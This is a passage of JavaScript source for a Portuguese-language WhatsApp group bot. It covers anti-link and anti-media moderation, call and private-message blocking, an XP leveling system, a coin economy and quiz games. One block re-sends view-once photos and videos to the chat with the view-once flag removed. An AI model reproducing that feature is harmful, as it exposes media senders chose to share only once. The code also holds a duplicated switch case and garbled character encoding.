if(isUrl(PR_String) && isAntiLinkHard && !isGroupAdmins && !isListaBrancaG && isBotGroupAdmins && !info.key.fromMe) {
if(Procurar_String.includes("chat.whatsapp.com")) {
link_dgp = await yoko.groupInviteCode(from)
if(Procurar_String.match(link_dgp)) return reply('Link do nosso grupo, nÃ£o irei remover..');
}
if(isCmd && isTrueFalse) return
if(IS_DELETE) {
setTimeout(async() => {
await yoko.sendMessage(from, { delete: { remoteJid: from, fromMe: false, id: info.key.id, participant: sender}});
}, 500);
}
await yoko.groupSettingUpdate(from, 'announcement');
setTimeout(async() => {
await yoko.groupSettingUpdate(from, 'not_announcement');
}, 1200);
if(!JSON.stringify(groupMembers).includes(sender)) return
await yoko.groupParticipantsUpdate(from, [sender], 'remove');
}

if(isUrl(PR_String) && isAntiLinkEasy && !isGroupAdmins && !isListaBrancaG && isBotGroupAdmins && !info.key.fromMe) {
if(Procurar_String.includes("chat.whatsapp.com")) {
link_dgp = await yoko.groupInviteCode(from)
if(Procurar_String.match(link_dgp)) return reply('Link do nosso grupo, nÃ£o irei deletar..');
}
if(isCmd && isTrueFalse) return
if(IS_DELETE) {
setTimeout(async() => {
await yoko.sendMessage(from, { delete: { remoteJid: from, fromMe: false, id: info.key.id, participant: sender}});
}, 500);
}
}

// ANTI NOTAS FAKES ==================>
if(isAntiNotas && budy2.toString().match(/(ğŸ’³|ğŸ’|ğŸ’¸|ğŸ’µ|ğŸ’·|ğŸ’¶|ğŸª™|ğŸ’°|ğŸ¤‘|âš–ï¸)/gi) && isBotGroupAdmins && !isGroupAdmins && !SoDono && !info.message?.reactionMessage?.text && budy2.length > 20) {
let verificar = budy2.toString().match(/(ğŸ’³|ğŸ’|ğŸ’¸|ğŸ’µ|ğŸ’·|ğŸ’¶|ğŸª™|ğŸ’°|ğŸ¤‘|âš–ï¸)/gi);
if(verificar && budy.length < 100) return  
if(IS_DELETE) {
setTimeout(async() => {
await yoko.sendMessage(from, { delete: { remoteJid: from, fromMe: false, id: info.key.id, participant: sender}});
}, 500);
}
if(!JSON.stringify(groupMembers).includes(sender)) return  
await yoko.groupParticipantsUpdate(from, [sender], 'remove');
}

//FINALZIN ===========================>
function remover(id, usu) {
yoko.groupParticipantsUpdate(id, [usu], "remove")}
//======(ANTI-VIDEO)========\\
if(isAntiVid && isBotGroupAdmins && type == 'videoMessage') {
if(isGroupAdmins) return await yoko.sendMessage(from, {text: mess.messageProhibitedDetAdmin()}, {quoted: selo});
if(dataGp[0].legenda_video == "0") {
await yoko.sendMessage(from, {text: mess.messageProhibitedDetUser()}, {quoted: selo});
} else {
await yoko.sendMessage(from, {text: dataGp[0].legenda_video}, {quoted: selo});
}
if(IS_DELETE) {
setTimeout(async() => {
await yoko.sendMessage(from, { delete: { remoteJid: from, fromMe: false, id: info.key.id, participant: sender}});
}, 500);
}
if(!JSON.stringify(groupMembers).includes(sender)) return
await yoko.groupParticipantsUpdate(from, [sender], 'remove');
}

//======(ANTI-AUDIO)=======\\
if(isAntiAudio && isBotGroupAdmins && type == 'audioMessage') {
if(isGroupAdmins) return await yoko.sendMessage(from, {text: mess.messageProhibitedDetAdmin()}, {quoted: selo});
await yoko.sendMessage(from, {text: mess.messageProhibitedDetUser()}, {quoted: selo});
if(IS_DELETE) {
setTimeout(async() => {
await yoko.sendMessage(from, { delete: { remoteJid: from, fromMe: false, id: info.key.id, participant: sender}});
}, 500);
}
if(!JSON.stringify(groupMembers).includes(sender)) return
await yoko.groupParticipantsUpdate(from, [sender], 'remove');
}

//========(ANTI_LIGAR)========\\
if(!isGroup && isAnticall) {
yoko.ws.on('CB:call', async (B) => {
var msgcallblock = `./yoko/bunker/database/func/call-msg_block-${sender}.json`  
if(!fs.existsSync(msgcallblock)) {
fs.writeFileSync(msgcallblock, JSON.stringify(mess.antiCalls(), null, 2));
var msgcallbl = JSON.parse(fs.readFileSync(msgcallblock));
if(B.content[0].tag == 'offer') {
await yoko.sendMessage(B.content[0].attrs['call-creator'], { text: msgcallbl }).then(async() => { 
await yoko.updateBlockStatus(B.content[0].attrs['call-creator'], "block");
DLT_FL(msgcallblock);
})
}
}
})
}


/* ANTIPV1 - Este anti pv bloqueia aqueles que encaminham mensagem no pv do bot.. */
var USUARIOS_BLOQ = []
if(isAntiPv && !USUARIOS_BLOQ.includes(sender)) {
if(!isGroup && !SoDono && !isnit && !isVip){ 
await sleep(2500)
reply(msgantipv1.replace('#nome#', pushname))
setTimeout(async () => {
await yoko.updateBlockStatus(sender, 'block')
}, 2000)
}
USUARIOS_BLOQ.push(sender);
} 

/* ANTIPV2 - Vai floodar o privado do usuÃ¡rio que encaminhar a mensagem no privado.. */
var MSG_ANTPV2_ENC = []
if(!isGroup && !isVip && !SoDono && !isnit && !issupre && !ischyt && !info.key.fromMe && isAntiPv2 && !MSG_ANTPV2_ENC.includes(sender)) {
MSG_ANTPV2_ENC.push(sender);
return reply(msgantipv2)
}

/* ANTIPV3 - Ignora todos os que falam ou usam os comandos no privado, exceto user vip e o proprietÃ¡rio atual do bot. */
if(!isGroup && !isVip && !SoDono && !info.key.fromMe && isAntiPv3) return

//====================================\\
var i9 = countMessage.map(i => i.groupId).indexOf(from)
var idgrupo = groupIdscount.indexOf(from)

var idusu = numbersIds?.indexOf(sender)

if(body != undefined && !info.message?.reactionMessage?.text && !JSON.stringify(level2).includes(sender) && isGroup) {
level2.push({id: sender, nick: pushname, level: 1, contador: 0, block: false})
fs.writeFileSync("./yoko/bunker/database/usuarios/leveling.json", JSON.stringify(level2))
}

if(body != undefined && !info.message?.reactionMessage?.text && JSON.stringify(level2).includes(sender) && level2[level2.map(i => i.id).indexOf(sender)].block == false && isGroup && isLevelingOn) {
AB = level2.map(i => i.id).indexOf(sender)
level2[AB].contador += 1
level2[AB].nick = pushname
fs.writeFileSync("./yoko/bunker/database/usuarios/leveling.json", JSON.stringify(level2))
switch(level2[AB].contador) {
case 100: case 200: case 300: case 400: case 500: case 600: case 700: case 800: case 900: case 1200: case 1500: case 1800: case 2100: case 2700: case 3300: case 3900: case 4500: case 5000: case 5500: case 6500: case 7500: case 9000: case 10500: case 12000: case 13500: case 15000: case 20000: case 25000: case 30000: case 35000: case 40000: case 50000: case 60000: case 70000: case 80000: case 90000: case 100000: case 150000: case 200000: case 300000: case 400000: case 500000: case 1000000: case 1500000: case 2000000: case 5000000:
var newlevel = level2[AB].contador + 1
if(newlevel < 100) newpatente = "Bronze I"
if(newlevel >= 100 && newlevel < 200) newpatente = "Bronze II"
if(newlevel >= 200 && newlevel < 300) newpatente = "Bronze III"
if(newlevel >= 300 && newlevel < 400) newpatente = "Prata I"
if(newlevel >= 400 && newlevel < 500) newpatente = "Prata II"
if(newlevel >= 500 && newlevel < 600) newpatente = "Prata III"
if(newlevel >= 600 && newlevel < 700) newpatente = "Ouro I"
if(newlevel >= 700 && newlevel < 800) newpatente = "Ouro II"
if(newlevel >= 800 && newlevel < 900) newpatente = "Ouro III"
if(newlevel >= 900 && newlevel < 1200) newpatente = "Ouro IV"
if(newlevel >= 1200 && newlevel < 1500) newpatente = "Platina I"
if(newlevel >= 1500 && newlevel < 1800) newpatente = "Platina II"
if(newlevel >= 1800 && newlevel < 2100) newpatente = "Platina III"
if(newlevel >= 2100 && newlevel < 2700) newpatente = "Platina IV"
if(newlevel >= 2700 && newlevel < 3300) newpatente = "Diamante I"
if(newlevel >= 3300 && newlevel < 3900) newpatente = "Diamante II"
if(newlevel >= 3900 && newlevel < 4500) newpatente = "Diamante III"
if(newlevel >= 4500 && newlevel < 5000) newpatente = "Diamante IV"
if(newlevel >= 5000 && newlevel < 5500) newpatente = "Paladino I"
if(newlevel >= 5500 && newlevel < 6500) newpatente = "Paladino II"
if(newlevel >= 6500 && newlevel < 7500) newpatente = "Paladino III"
if(newlevel >= 7500 && newlevel < 9000) newpatente = "Paladino IV"
if(newlevel >= 9000 && newlevel < 10500) newpatente = "Mestre Iï¸"
if(newlevel >= 10500 && newlevel < 12000) newpatente = "Mestre II"
if(newlevel >= 12000 && newlevel < 13500) newpatente = "Mestre IIIï¸"
if(newlevel >= 13500 && newlevel < 15000) newpatente = "Mestre IVï¸"
if(newlevel >= 15000 && newlevel < 20000) newpatente = "Mestre Vï¸"
if(newlevel >= 20000 && newlevel < 25000) newpatente = "Desafiante I"
if(newlevel >= 25000 && newlevel < 30000) newpatente = "Desafiante II"
if(newlevel >= 30000 && newlevel < 35000) newpatente = "Desafiante III"
if(newlevel >= 35000 && newlevel < 40000) newpatente = "Desafiante IV"
if(newlevel >= 40000 && newlevel < 50000) newpatente = "Desafiante V"
if(newlevel >= 50000 && newlevel < 60000) newpatente = "UsuÃ¡rio Superior I"
if(newlevel >= 60000 && newlevel < 70000) newpatente = "UsuÃ¡rio Superior II"
if(newlevel >= 70000 && newlevel < 80000) newpatente = "Mestre Supremo I"
if(newlevel >= 80000 && newlevel < 90000) newpatente = "Mestre Supremo II"
if(newlevel >= 90000 && newlevel < 100000) newpatente = "Mestre Supremo III"
if(newlevel >= 100000 && newlevel < 150000) newpatente = "Conquistador Iï¸"
if(newlevel >= 150000 && newlevel < 200000) newpatente = "Conquistador IIï¸"
if(newlevel >= 200000 && newlevel < 300000) newpatente = "Conquistador IIIï¸"
if(newlevel >= 300000 && newlevel < 400000) newpatente = "Desbravador Iï¸"
if(newlevel >= 400000 && newlevel < 500000) newpatente = "Desbravador IIï¸"
if(newlevel >= 500000 && newlevel < 1000000) newpatente = "Desbravador IIIï¸"
if(newlevel >= 1000000 && newlevel < 1500000) newpatente = "Grande Mestre I"
if(newlevel >= 1500000 && newlevel < 2000000) newpatente = "Grande Mestre II"
if(newlevel >= 2000000 && newlevel < 5000000) newpatente = "Grande Mestre III"
if(newlevel >= 5000000 && newlevel < 10000000) newpatente = "Legancy X"
if(newlevel >= 10000000) newpatente = "Veterano"
level2[AB].level += 1
fs.writeFileSync("./yoko/bunker/database/usuarios/leveling.json", JSON.stringify(level2));
try {u = await yoko.profilePictureUrl(sender)} catch(erro) {u = 'https://telegra.ph/file/2fbfa46b4ea3baed434d1.jpg'}
gerarBuffer = await getBuffer(u); photoUser = await upload(gerarBuffer)
await yoko.sendMessage(from, {image: {url: API_URL+`/api/canvas/levelup?foto=${photoUser}&nome=${getName(sender) || "UsuÃ¡rio(a)"}&lvb=${level2[level2.map(i => i.id).indexOf(sender)].level - 1}&lva=${level2[level2.map(i => i.id).indexOf(sender)].level}&fundo=${fundolevel}`}, caption: `ğŸ‰ ParabÃ©ns *@${sender.split("@")[0]}*, vocÃª acaba de subir de level.\nâ€¢ Novo level foi alcanÃ§ado por completar *${level2[AB].contador} XP.*\nNova patente desbloqueada, vocÃª agora Ã© *${newpatente}*`, mentions: [sender]}, {quoted: selo});
break
case 10000000:
BC = level2.map(i => i.id).indexOf(sender)
level2[BC].level += 1
fs.writeFileSync("./yoko/bunker/database/usuarios/leveling.json", JSON.stringify(level2))
try {u2 = await yoko.profilePictureUrl(sender)} catch(erro) {u2 = 'https://telegra.ph/file/2fbfa46b4ea3baed434d1.jpg'}
gerarBuffer2 = await getBuffer(u2); photoUser2 = await upload(gerarBuffer2)
await yoko.sendMessage(from, {image: {url: API_URL+`/api/canvas/levelup?foto=${photoUser2}&nome=${getName(sender)}&lvb=${level2[level2.map(i => i.id).indexOf(sender)].level - 1}&lva=${level2[level2.map(i => i.id).indexOf(sender)].level}&fundo=${fundolevel}`}, caption: `ğŸ‰ ParabÃ©ns *@${sender.split("@")[0]}*, vocÃª completou com sucesso 10M de XP, possuindo assim o tÃ­tulo de *Veterano ğŸ©*\nâ€“\nâ€¢ Todos os nÃ­veis daqui pra frente serÃ£o contados a cada 1M de XP... Nossa equipe se orgulha de coroar vocÃª, depois de tanto esforÃ§o e desempenho, apÃ³s muito tempo de uso de nosso sistemas. ${tempo}!`, mentions: [sender]}, {quoted: selo});
break
case 10000000: case 11000000: case 12000000: case 13000000: case 14000000: case 15000000: case 16000000: case 17000000: case 18000000: case 19000000: case 20000000: case 21000000: case 22000000: case 23000000: case 24000000: case 25000000: case 26000000: case 27000000: case 28000000: case 29000000: case 30000000:
CD = level2.map(i => i.id).indexOf(sender)
level2[CD].level += 1
fs.writeFileSync("./yoko/bunker/database/usuarios/leveling.json", JSON.stringify(level2))
try {u3 = await yoko.profilePictureUrl(sender)} catch(erro) {u3 = 'https://telegra.ph/file/2fbfa46b4ea3baed434d1.jpg'}
gerarBuffer3 = await getBuffer(u3); photoUser3 = await upload(gerarBuffer3)
await yoko.sendMessage(from, {image: {url: API_URL+`/api/canvas/levelup?foto=${photoUser3}&nome=${getName(sender)}&lvb=${level2[level2.map(i => i.id).indexOf(sender)].level - 1}&lva=${level2[level2.map(i => i.id).indexOf(sender)].level}&fundo=${fundolevel}`}, caption: `*ğŸ‰ LEGANCY LEVEL UP! ğŸ–ï¸*\nMeus parabÃ©ns querido usuÃ¡rio veterano *@${sender.split("@")[0]}*.\nâ€¢ Sua experiÃªncia acaba de levar a quantidade total de XP Ã  triplicar. Agora vocÃª tem *${level2[CD].contador} XP*\nâ€“\n*Obs:* Sua patente atual continua sendo a mesma, pois vocÃª chegou Ã  maior.`, mentions: [sender]}, {quoted: selo});
break
}
}

const VerificarJSON = (json, value) => {
if(JSON.stringify(json).includes(value)) return true
return false
}

const RG_SCOINS = JSON.parse(fs.readFileSync("./yoko/bunker/database/func/coins.json"));

const isModoCoins = isGroup ? dataGp[0].isModoCoins : undefined

const ID_G_COINS = RG_SCOINS.findIndex(i => i.grupo === from)
const ID_USU_COINS = RG_SCOINS[ID_G_COINS]?.usus?.findIndex(i => i.id === sender);

function CoinsUpdate(index){
fs.writeFileSync("./yoko/bunker/database/func/coins.json", JSON.stringify(index, null, 2) + "\n")
}

const SYSTEM_COIN = {

  AdicionarCoins: async function(user, quant) {
  CoinsUser_ = RG_SCOINS[ID_G_COINS].usus.find(i => i.id === user);
  if(!CoinsUser_) return reply("O(a) usuÃ¡rio(a) nunca enviou uma mensagem neste grupo! EntÃ£o nÃ£o Ã© possÃ­vel adicionar ou transferir coins Ã  um membro que nÃ£o possuÃ­ registro!");
  CoinsUser_["coins"] += quant;
  CoinsUpdate(RG_SCOINS);
  },
  
  transferCoins: async function(transferidor, recebidor, quantidade) {
  DM_ = RG_SCOINS[ID_G_COINS].usus.find(i => i.id === transferidor)
  DM_2 = RG_SCOINS[ID_G_COINS].usus.find(i => i.id === recebidor)
  if((DM_?.coins || 0) < quantidade) return mention(`A quantidade que vocÃª tem Ã© inferior a que vocÃª deseja transferir ao usuÃ¡rio: @${recebidor.split("@")[0]}`)
  if(!DM_2) return mention(`O(a) usuÃ¡rio(a) '@${recebidor.split("@")[0]}' nunca enviou uma mensagem neste grupo! EntÃ£o nÃ£o Ã© possÃ­vel adicionar ou transferir coins Ã  um usuÃ¡rio nÃ£o registrado no meu sistema!`);
  DM_["coins"] -= quantidade;
  DM_2["coins"] += quantidade;
  CoinsUpdate(RG_SCOINS);
  },
  
  Adicionar_2: async function(A, Q, X, X2) {
  DM_ = RG_SCOINS[ID_G_COINS].usus.find(i => i.id === A);
  if(!DM_) return reply("O(a) usuÃ¡rio(a) nunca enviou uma mensagem neste grupo! EntÃ£o nÃ£o Ã© possÃ­vel atualizar a carteira!");
  DM_["coins"] += Q;
  DM_[X] = X2
  CoinsUpdate(RG_SCOINS);
  },
  
  RemoverCoins: async function(user, quant) {
  CoinsUser = RG_SCOINS[ID_G_COINS].usus.find(i => i.id === user)
  if(!CoinsUser) return reply("O(a) usuÃ¡rio(a) nunca enviou uma mensagem neste grupo! EntÃ£o nÃ£o Ã© possÃ­vel remover coins de membro inativo que nÃ£o possuÃ­ registro!");
  if((CoinsUser?.coins || 0) < quant) return reply(`O usuÃ¡rio possuÃ­ '${CoinsUser?.coins} N-Coins', este valor nÃ£o Ã© suficiente para realizar a transaÃ§Ã£o de remoÃ§Ã£o de ${quant}.`);
  CoinsUser["coins"] -= quant;
  CoinsUpdate(RG_SCOINS);
  },
  
VerificarCampo: function(user, parameter) {
  return RG_SCOINS[ID_G_COINS].usus.find(i => i.id === user)[parameter] || null;
},
  
  }
  
  if(isModoCoins && isGroup && isBotGroupAdmins && VRF_JSON_GRUPO && !info.key.fromMe) {
  
  if(!RG_SCOINS.some(i => i.grupo === from)) {
  RG_SCOINS.push({grupo: from, usus: [{id: sender, coins: 0, data: 0, chances: {cassino: 0, minerar: 0}}]})
  CoinsUpdate(RG_SCOINS);
  } else if(RG_SCOINS.some(i => i.grupo === from) && !RG_SCOINS[ID_G_COINS]?.usus?.some(i => i?.id === sender)) {
  RG_SCOINS[ID_G_COINS].usus.push({id: sender, coins: 0, data: 0, chances: {cassino: 0, minerar: 0}})
  CoinsUpdate(RG_SCOINS);
  }
  
  if(isCmd && !info.message?.reactionMessage?.text && dattofc != SYSTEM_COIN.VerificarCampo(sender, "data")) {
  await mention(`${tempo}, usuÃ¡rio(a): @${sender.split('@')[0]}! VocÃª ganhou *35 N-Coins* com a sua primeira interaÃ§Ã£o do dia comigo! VocÃª tem diversas chances de se divertir no grupo. â™¦ï¸ğŸ’°`);
  SYSTEM_COIN.Adicionar_2(sender, 35, "data", dattofc);
  RG_US = RG_SCOINS[ID_G_COINS].usus.find(i => i.id === sender);
  Object.assign(RG_US.chances, {"cassino": 0, "minerar": 0});
  CoinsUpdate(RG_SCOINS);
  }
  }

  if(isGroup && fs.existsSync(`./yoko/bunker/database/grupos/games/anagrama/${from}.json`)){
    let dataA = JSON.parse(fs.readFileSync(`./yoko/bunker/database/grupos/games/anagrama/${from}.json`))
    if(budy.slice(0,4).toUpperCase() == dataA.palavraOriginal.slice(0,4).toUpperCase() && budy.toUpperCase() != dataA.palavraOriginal) return reply('EstÃ¡ perto...')
    if(budy.toUpperCase() == dataA.palavraOriginal) {
    await yoko.sendMessage(from, {text: `ğŸ‰ ParabÃ©ns *${pushname}*, vocÃª acertou o anagrama apresentado, como recompensa vocÃª acaba de ganhar 5 N-Coins.\nA palavra original era: *${dataA.resposta}*. Estou iniciando o prÃ³ximo jogo em 5s!`}, {"mentionedJid": [sender]}, {quoted: selo})
    await SYSTEM_COIN.AdicionarCoins(sender, 5);
    fs.unlinkSync(`./yoko/bunker/database/grupos/games/anagrama/${from}.json`)		
    setTimeout(async() => {
    fs.writeFileSync(`./yoko/bunker/database/grupos/games/anagrama/${from}.json`, `${JSON.stringify(palavrasANA[Math.floor(Math.random() * palavrasANA.length)])}`)
    dataAB = JSON.parse(fs.readFileSync(`./yoko/bunker/database/grupos/games/anagrama/${from}.json`))
    yoko.sendMessage(from, {text: `â™¦ï¸ğŸ˜² Decifre a palavra embaralhada abaixo, qual serÃ¡ a ordem correta?\nâ€”\nâ€¢ Anagrama: *${shuffle(dataAB.palavraOriginal)}*\nâ€¢ Dica: ${dataAB.dica}`}, {quoted: selo})
    }, 5000)
    }}
    
    if(isGroup && fs.existsSync(`./yoko/bunker/database/grupos/games/quiz-animais/${from}.json`)){
    let dQ = JSON.parse(fs.readFileSync(`./yoko/bunker/database/grupos/games/quiz-animais/${from}.json`))
    if(budy.slice(0,4).toUpperCase() == dQ.original.slice(0,4).toUpperCase() && budy.toUpperCase() != dQ.original) return reply('estÃ¡ perto')
    if(budy.toUpperCase() == dQ.original) { 
    await yoko.sendMessage(from,{text: `ğŸ‰ ParabÃ©ns *${pushname}*, vocÃª acertou, como recompensa vocÃª acaba de ganhar 5 N-Coins! O animal era: *${dQ.resposta}*.\nâ€¢ Estou iniciando o prÃ³ximo jogo em 5s!`}, {"mentionedJid": [sender]}, {quoted: selo}) 
    await SYSTEM_COIN.AdicionarCoins(sender, 5);
    fs.unlinkSync(`./yoko/bunker/database/grupos/games/quiz-animais/${from}.json`)		
    setTimeout(async() => {
    fs.writeFileSync(`./yoko/bunker/database/grupos/games/quiz-animais/${from}.json`, `${JSON.stringify(quizanimais[Math.floor(Math.random() * quizanimais.length)])}`)
    dataQA = JSON.parse(fs.readFileSync(`./yoko/bunker/database/grupos/games/quiz-animais/${from}.json`))
    wew = await getBuffer(dataQA.foto)
    await yoko.sendMessage(from, {image: wew, caption: `ğŸ¤” Pergunta: ${dataQA.question}`}, {quoted: selo})
    }, 5000)
    }
    }
    
    if(isGroup && fs.existsSync(`./yoko/bunker/database/grupos/games/quiz-futebol/${from}.json`)){
    let dQF = JSON.parse(fs.readFileSync(`./yoko/bunker/database/grupos/games/quiz-futebol/${from}.json`))
    if(budy.slice(0,4).toUpperCase() == dQF.resposta.slice(0,4).toUpperCase() && budy.toUpperCase() != dQF.resposta) return reply('estÃ¡ perto')
    if(budy.toUpperCase() == dQF.resposta) { 
    await yoko.sendMessage(from,{text: `ğŸ‰ ParabÃ©ns *${pushname}*, vocÃª acertou, como recompensa vocÃª acaba de ganhar 5 N-Coins! O time era: *${dQF.resposta}*.\nâ€¢ Estou iniciando o prÃ³ximo jogo em 5s!`}, {"mentionedJid": [sender]}, {quoted: selo}) 
    await SYSTEM_COIN.AdicionarCoins(sender, 5);
    fs.unlinkSync(`./yoko/bunker/database/grupos/games/quiz-futebol/${from}.json`)		
    setTimeout(async() => {
    fs.writeFileSync(`./yoko/bunker/database/grupos/games/quiz-futebol/${from}.json`, `${JSON.stringify(quizFutebol[Math.floor(Math.random() * quizFutebol.length)])}`)
    dataQF = JSON.parse(fs.readFileSync(`./yoko/bunker/database/grupos/games/quiz-futebol/${from}.json`))
    await yoko.sendMessage(from, {text: `ğŸ’«âš½ ğğ”ğˆğ™ ğ…ğ”ğ“ğ„ğğğ‹ âš½ğŸ’«\nâ€“\n*ğŸ—£ï¸| Responda a pergunta mostrada abaixo:*\nâ€¢ _${dataQF.pergunta}_`}, {quoted: selo})
    }, 5000)
    }
    }
    
    if(isGroup && fs.existsSync(`./yoko/bunker/database/grupos/games/gartic/${from}.json`)){
    let perg_gartic = JSON.parse(fs.readFileSync(`./yoko/bunker/database/grupos/games/gartic/${from}.json`))
    if(budy.slice(0,4).toUpperCase() == perg_gartic.resposta.slice(0,4).toUpperCase() && budy.toUpperCase() != perg_gartic.resposta) return reply('EstÃ¡ perto!')
    if(budy.toUpperCase() == perg_gartic.resposta) { 
    await yoko.sendMessage(from,{text: `*DESCOBERTO!* ParabÃ©ns ${pushname} como recompensa vocÃª acaba de ganhar 5 N-Coins. Iniciando o prÃ³ximo jogo em 5 segundos.`}, {"mentionedJid": [sender]}, {quoted: selo}); 
    await SYSTEM_COIN.AdicionarCoins(sender, 5);
    fs.unlinkSync(`./yoko/bunker/database/grupos/games/gartic/${from}.json`);
    setTimeout(async() => {
    fs.writeFileSync(`./yoko/bunker/database/grupos/games/gartic/${from}.json`, `${JSON.stringify(garticArchives[Math.floor(Math.random() * garticArchives.length)])}`)
    let dataGartic2 = JSON.parse(fs.readFileSync(`./yoko/bunker/database/grupos/games/gartic/${from}.json`))
    garticText = `ğŸ‘©ğŸ¼â€ğŸ« - A resposta Ã© representada por um(a): ${dataGartic2.pergunta}\nğŸ“œ - A resposta supostamente comeÃ§a com a(s) letra(s): "${dataGartic2.letra_inicial}"\nğŸ¤” - Hmmm, contÃ©m traÃ§os? ${dataGartic2.contem_traÃ§os}\nâ€“\nâ“ï¸ - *NÃ£o sabe a resposta?* _PeÃ§a ao adm do grupo para usar o comando *${prefix}revelargartic* para revelar a resposta correta da afirmaÃ§Ã£o._`
    wew = await getBuffer(`${dataGartic2.imagem}`)
    await yoko.sendMessage(from, {image: wew, caption: garticText}, {quoted: selo})
    }, 5000)
    }
    }
    
    if(isGroup && fs.existsSync(`./yoko/bunker/database/grupos/games/enigma/${from}.json`)){
    let enigmaData = JSON.parse(fs.readFileSync(`./yoko/bunker/database/grupos/games/enigma/${from}.json`))
    if(budy.slice(0,4).toUpperCase() == enigmaData.respostaEne.slice(0,4).toUpperCase() && budy.toUpperCase() != enigmaData.respostaEne) return reply('EstÃ¡ perto!')
    if(budy.toUpperCase() == enigmaData.respostaEne) { 
    yoko.sendMessage(from,{text: `*ENIGMA RESOLVIDO!* ParabÃ©ns ${pushname}, como recompensa vocÃª acaba de ganhar 5 N-Coins.Iniciando o prÃ³ximo jogo em 5 segundos.`}, {"mentionedJid": [sender]}, {quoted: selo})
    await SYSTEM_COIN.AdicionarCoins(sender, 5);
    fs.unlinkSync(`./yoko/bunker/database/grupos/games/enigma/${from}.json`)	
    setTimeout(async() => {
    fs.writeFileSync(`./yoko/bunker/database/grupos/games/enigma/${from}.json`, `${JSON.stringify(enigmaArchive[Math.floor(Math.random() * enigmaArchive.length)])}`)
    enigmaD = JSON.parse(fs.readFileSync(`./yoko/bunker/database/grupos/games/enigma/${from}.json`))
    enigmaTezt = `ğŸ“œ - Resolva o seguinte enigma abaixo:\nâ€“\n${enigmaD.charada}\nâ€“\nâ“ï¸ - *NÃ£o sabe a resposta?* _PeÃ§a ao adm do grupo para usar o comando *${prefix}revelarenigma* para revelar a resposta correta da enigma._`
    wew = await getBuffer(`https://telegra.ph/file/15be608763684b3e3af38.jpg`)
    await yoko.sendMessage(from, {image: wew, caption: enigmaTezt}, {quoted: selo})
    }, 5000)
    }
    }
    
    if(isGroup && fs.existsSync(`./yoko/bunker/database/grupos/games/wmusic/${from}.json`)){
    whatMusic = JSON.parse(fs.readFileSync(`./yoko/bunker/database/grupos/games/wmusic/${from}.json`))
    if(budy.slice(0,4).toUpperCase() == whatMusic.resposta.slice(0,4).toUpperCase() && budy.toUpperCase() != whatMusic.resposta) return reply('TÃ¡ perto hein! Tente novamente...')
    if(budy.toUpperCase() == whatMusic.resposta) { 
    yoko.sendMessage(from,{text: `â€¢ Resposta Correta: *${whatMusic.resposta}*\nParabÃ©ns ${pushname}, como recompensa vocÃª acaba de ganhar 5 N-Coins. Iniciando o prÃ³ximo jogo em 5 segundos!`}, {"mentionedJid": [sender]}, {quoted: selo}); fs.unlinkSync(`./yoko/bunker/database/grupos/games/wmusic/${from}.json`);
    setTimeout(async() => {
    fs.writeFileSync(`./yoko/bunker/database/grupos/games/wmusic/${from}.json`, `${JSON.stringify(whatMusicAr[Math.floor(Math.random() * whatMusicAr.length)])}`)
    wmusic = JSON.parse(fs.readFileSync(`./yoko/bunker/database/grupos/games/wmusic/${from}.json`))
    textM = `ğŸ¶ğŸ§ ğ–ğ‡ğ€ğ“ ğŒğ”ğ’ğˆğ‚? ğŸ˜±ğŸ’¡\nâ€“\n${wmusic.trechoMusic}\nâ€“\nğŸ¤”ğŸ˜± Qual mÃºsica pertence o trecho apresentado acima?\nâ€¢ ${II}Dica:${II} ${wmusic.dica}`
    await yoko.sendMessage(from, {text: textM}, {quoted: selo})
    }, 5000)
    }
    }
    
if(isX9VisuUnica) {
if(info.message?.viewOnceMessageV2 || type == "viewOnceMessage") {
if(JSON.stringify(info).includes("videoMessage")) {
var px = info.message?.viewOnceMessageV2?.message?.videoMessage || info.message?.viewOnceMessage?.message?.videoMessage
px.viewOnce = false
px.video = {url: px.url}
px.caption += "\n\nRevelando o vÃ­deo na visualizaÃ§Ã£o Ãºnica enviada.."
yoko.sendMessage(from,px)
} else {
var px = info.message?.viewOnceMessageV2?.message?.imageMessage || info.message?.viewOnceMessage?.message?.imageMessage
px.viewOnce = false
px.image = {url: px.url}
px.caption += "\n\nRevelando a imagem na visualizaÃ§Ã£o Ãºnica enviada..."
yoko.sendMessage(from,px)
}}}

if (isx9 && type === "pinInChatMessage") {
duration = info.message?.messageContextInfo?.messageAddOnDurationInSecs;
fixedTime = (duration) => (duration === 0) ? "0" : (duration >= 30 * 24 * 60 * 60) ? "30d" : (duration >= 7 * 24 * 60 * 60) ? "7d" : (duration >= 24 * 60 * 60) ? "24h" : duration;
action = fixedTime(duration) === "0" ? 'desfixar uma mensagem' : `fixar uma mensagem por *${fixedTime(duration)}*`;
await yoko.sendMessage(from, {text: `O admin *@${sender.split("@")[0]}* acabou de ${action}.`, mentions: [sender]})
}

/////\\\\\\//////\\\\\\////\\\\////\\\///\\\///\\\\

if(isCmd && isBanned) return reply(mess.bannedUser())

const totalhit = JSON.parse(fs.readFileSync('./yoko/bunker/database/data/totalcmd.json'))
const CmdUsedBOT = () => {
totalhit[0].totalcmd += 1
fs.writeFileSync('./yoko/bunker/database/data/totalcmd.json', JSON.stringify(totalhit))
}
if (isCmd) CmdUsedBOT()

const reqcmd = JSON.parse(fs.readFileSync('./yoko/bunker/database/data/totalcmd.json'))

if (isGroup && isCmd && !isGroupAdmins && !SoDono && !isVip && dataGp[0]?.Limitar_CMD) {
var TEMPO_A = Math.floor(Date.now() / 1000) 
var ID_G = Limit_CMD.findIndex(i => i.idgp === from)
var ID_U = Limit_CMD[ID_G]?.ids.findIndex(i => i.id === sender)
if(!JSON.stringify(Limit_CMD).includes(from) || ID_G < 0 && ID_U < 0) {
Limit_CMD.push({idgp: from, ids: [{id: sender, tempo: TEMPO_A}]})
fs.writeFileSync("./yoko/bunker/database/func/limitarcmd.json", JSON.stringify(Limit_CMD, null, 2));
} else if(ID_G >= 0 && ID_U < 0) {
Limit_CMD[ID_G].ids.push({id: sender, tempo: TEMPO_A})
fs.writeFileSync("./yoko/bunker/database/func/limitarcmd.json", JSON.stringify(Limit_CMD, null, 2));
}

if(ID_G >= 0 && ID_U >= 0) {
var TEMPO_D = Limit_CMD[ID_G].ids[ID_U].tempo;
var TEMPO_M = TEMPO_A - TEMPO_D
var TEMPO_D2 = parseInt(dataGp[0]?.Limit_tempo) || 60
if(TEMPO_M < TEMPO_D2) {
return reply(nescessario.TEMPO_DE_CMD.replaceAll("#tempocmd#", TimeCount(TEMPO_M)).replaceAll("#tempo#", TEMPO_D2))
} else {
Limit_CMD[ID_G].ids[ID_U].tempo = TEMPO_A
fs.writeFileSync("./yoko/bunker/database/func/limitarcmd.json", JSON.stringify(Limit_CMD, null, 2));
}
